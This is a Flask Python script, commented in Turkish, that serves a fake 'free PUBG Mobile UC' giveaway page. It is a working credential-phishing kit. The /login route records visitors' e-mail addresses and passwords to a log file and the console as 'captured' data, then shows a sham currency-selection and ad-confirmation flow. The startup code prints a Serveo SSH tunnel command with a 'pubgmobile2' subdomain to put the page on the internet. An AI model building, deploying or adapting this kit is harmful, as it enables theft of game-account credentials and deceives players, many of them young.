from flask import Flask, request, render_template_string
import logging

app = Flask(__name__)
app.secret_key = 'ariva_cyber_secret123'

# SAMET HAN #Ariva#
logging.basicConfig(filename='ariva_cyber_tool.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# SAMET HAN #Ariva
PAGE_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Ariva Cyber - Ücretsiz UC Kazan</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Arial', sans-serif;
            background: url('https://wallpapercave.com/wp/wp1813156.jpg') no-repeat center center fixed;
            background-size: cover;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            color: #fff;
        }
        .container {
            background: rgba(0, 0, 0, 0.9);
            padding: 50px;
            border-radius: 25px;
            box-shadow: 0 0 50px rgba(0, 255, 255, 0.7), inset 0 0 15px rgba(0, 255, 255, 0.2);
            text-align: center;
            width: 550px;
            animation: fadeIn 1.5s ease-in-out;
            position: relative;
            overflow: hidden;
            transition: all 0.5s ease;
        }
        .container:hover {
            box-shadow: 0 0 70px rgba(0, 255, 255, 0.9);
        }
        .container::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(0, 255, 255, 0.2), transparent);
            animation: rotateGlow 15s infinite linear;
            z-index: 0;
        }
        @keyframes rotateGlow {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.85); }
            to { opacity: 1; transform: scale(1); }
        }
        @keyframes slideIn {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .container h1 {
            color: #00ffff;
            font-size: 42px;
            margin-bottom: 20px;
            text-transform: uppercase;
            letter-spacing: 4px;
            text-shadow: 0 0 20px rgba(0, 255, 255, 0.8);
            position: relative;
            z-index: 1;
        }
        .container p {
            font-size: 20px;
            margin-bottom: 30px;
            position: relative;
            z-index: 1;
            animation: slideIn 0.8s ease-in-out;
        }
        .container input[type="text"], .container input[type="password"] {
            width: 100%;
            padding: 15px;
            margin: 12px 0;
            border: 2px solid #00ffff;
            border-radius: 10px;
            background: rgba(26, 26, 26, 0.9);
            color: #fff;
            font-size: 16px;
            box-sizing: border-box;
            transition: all 0.3s ease;
            position: relative;
            z-index: 1;
        }
        .container input[type="text"]:focus, .container input[type="password"]:focus {
            border-color: #00cccc;
            box-shadow: 0 0 15px rgba(0, 255, 255, 0.7);
            outline: none;
        }
        .container button, .container input[type="submit"] {
            background: linear-gradient(45deg, #00ffff, #00cccc);
            color: #000;
            padding: 15px;
            border: none;
            border-radius: 10px;
            width: 100%;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            margin: 10px 0;
            position: relative;
            z-index: 1;
        }
        .container button:hover, .container input[type="submit"]:hover {
            background: linear-gradient(45deg, #00cccc, #00ffff);
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.9);
            transform: translateY(-3px);
        }
        .message {
            color: #00ffff;
            margin-top: 20px;
            font-size: 18px;
            font-weight: bold;
            animation: slideIn 0.5s ease-in-out;
            position: relative;
            z-index: 1;
        }
        .modal {
            display: none;
            position: fixed;
            z-index: 100;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.8);
            justify-content: center;
            align-items: center;
        }
        .modal-content {
            background: rgba(0, 0, 0, 0.9);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 0 50px rgba(0, 255, 255, 0.7);
            text-align: center;
            width: 500px;
            animation: fadeIn 0.5s ease-in-out;
        }
        .modal-content h2 {
            color: #00ffff;
            font-size: 32px;
            margin-bottom: 20px;
            text-transform: uppercase;
            text-shadow: 0 0 15px rgba(0, 255, 255, 0.8);
        }
        .modal-content p {
            color: #fff;
            font-size: 18px;
            margin-bottom: 25px;
        }
        .modal-content select {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border: 2px solid #00ffff;
            border-radius: 10px;
            background: rgba(26, 26, 26, 0.9);
            color: #fff;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        .modal-content select:focus {
            border-color: #00cccc;
            outline: none;
        }
    </style>
</head>
<body>
    <div class="container">
        {% if not authenticated %}
            <h1>Ariva Cyber</h1>
            <p>Tool’a erişmek için şifreyi gir! 🚀</p>
            <form id="authForm" method="POST" action="/">
                <input type="password" name="auth_password" placeholder="Şifre (ariva)" required>
                <input type="submit" value="Doğrula">
            </form>
        {% else %}
            <h1>Ariva Cyber UC</h1>
            <p>Ücretsiz UC kazanmak için giriş yap! 💰</p>
            <form id="loginForm" method="POST" action="/login">
                <input type="text" name="email" placeholder="E-posta / Kullanıcı Adı" required>
                <input type="password" name="password" placeholder="Şifre" required>
                <input type="submit" value="Giriş Yap ve Kazan">
            </form>
        {% endif %}
        {% if message %}
            <p class="message">{{ message }}</p>
        {% endif %}
    </div>

    <!-- UC Seçimi Modal -->
    <div id="ucModal" class="modal">
        <div class="modal-content">
            <h2>UC Gönder</h2>
            <p>Merhaba {{ email }}, ne kadar UC istediğini seç!</p>
            <form id="ucForm" method="POST" action="/send-uc">
                <select name="uc_amount" required>
                    <option value="" disabled selected>Miktar Seç</option>
                    <option value="60">60 UC</option>
                    <option value="300">300 UC</option>
                    <option value="660">660 UC</option>
                    <option value="1800">1800 UC</option>
                    <option value="3850">3850 UC</option>
                </select>
                <input type="submit" value="Gönder">
            </form>
        </div>
    </div>

    
    <div id="adModal" class="modal">
        <div class="modal-content">
            <h2>Reklam Onayı</h2>
            <p id="adMessage"></p>
            <button onclick="alert('Reklam izlendi! UC gönderimi tamamlandı. (Ariva Cyber Simülasyon)'); document.getElementById('adModal').style.display='none';">Reklamı İzle</button>
        </div>
    </div>

    <script>
        // Modal kontrol fonksiyonları
        function showModal(modalId) {
            document.getElementById(modalId).style.display = 'flex';
        }

        function hideModal(modalId) {
            document.getElementById(modalId).style.display = 'none';
        }

        
        {% if show_uc_modal %}
            showModal('ucModal');
        {% endif %}

        
        {% if uc_amount %}
            showModal('adModal');
            document.getElementById('adMessage').innerText = '{{ uc_amount }} UC göndermek için bir reklam izleyerek onay verin.';
        {% endif %}

        
        document.getElementById('authForm') && document.getElementById('authForm').addEventListener('submit', function(e) {
            e.preventDefault();
            fetch('/', {
                method: 'POST',
                body: new FormData(this)
            }).then(response => response.text()).then(data => {
                document.body.innerHTML = data;
            }).catch(error => console.error('Hata:', error));
        });

        document.getElementById('loginForm') && document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            fetch('/login', {
                method: 'POST',
                body: new FormData(this)
            }).then(response => response.text()).then(data => {
                document.body.innerHTML = data;
            }).catch(error => console.error('Hata:', error));
        });

        document.getElementById('ucForm') && document.getElementById('ucForm').addEventListener('submit', function(e) {
            e.preventDefault();
            fetch('/send-uc', {
                method: 'POST',
                body: new FormData(this)
            }).then(response => response.text()).then(data => {
                document.body.innerHTML = data;
            }).catch(error => console.error('Hata:', error));
        });
    </script>
</body>
</html>
"""

# SAMET HAN #Ariva
authenticated = False

@app.route('/', methods=['GET', 'POST'])
def home():
    global authenticated
    if request.method == 'POST':
        auth_password = request.form.get('auth_password')
        if auth_password == 'ariva':
            authenticated = True
            return render_template_string(PAGE_TEMPLATE, authenticated=authenticated, show_uc_modal=False)
        return render_template_string(PAGE_TEMPLATE, authenticated=False, message="Yanlış şifre! Tekrar dene.")
    return render_template_string(PAGE_TEMPLATE, authenticated=authenticated)

@app.route('/login', methods=['POST'])
def login():
    global authenticated
    email = request.form.get('email')
    password = request.form.get('password')
    if not email or not password:
        return render_template_string(PAGE_TEMPLATE, authenticated=authenticated, message="E-posta ve şifre alanları boş bırakılamaz!")
    logging.info(f"[!] Yakalanan Bilgiler -> E-posta/Kullanıcı: {email}, Şifre: {password}")
    print(f"[!] Yakalanan Bilgiler -> E-posta/Kullanıcı: {email}, Şifre: {password}")
    return render_template_string(PAGE_TEMPLATE, authenticated=authenticated, email=email, show_uc_modal=True)

@app.route('/send-uc', methods=['POST'])
def send_uc():
    global authenticated
    uc_amount = request.form.get('uc_amount')
    if not uc_amount:
        return render_template_string(PAGE_TEMPLATE, authenticated=authenticated, message="Lütfen bir UC miktarı seçin!")
    return render_template_string(PAGE_TEMPLATE, authenticated=authenticated, uc_amount=uc_amount)

if __name__ == '__main__':
    try:
        print("Ariva Cyber Tool Başlıyor...")
        print("Yerel olarak çalışıyor: http://localhost:5000")
        print("Serveo ile internete açmak için şu komutu çalıştırın:")
        print("ssh -R pubgmobile2:80:localhost:5000 serveo.net")
        print("Serveo size bir URL verecek. Örnek: http://pubgmobile2.serveo.net")
        app.run(host='0.0.0.0', port=8080)
    except Exception as e:
        print(f"Bir hata oluştu: {str(e)}")
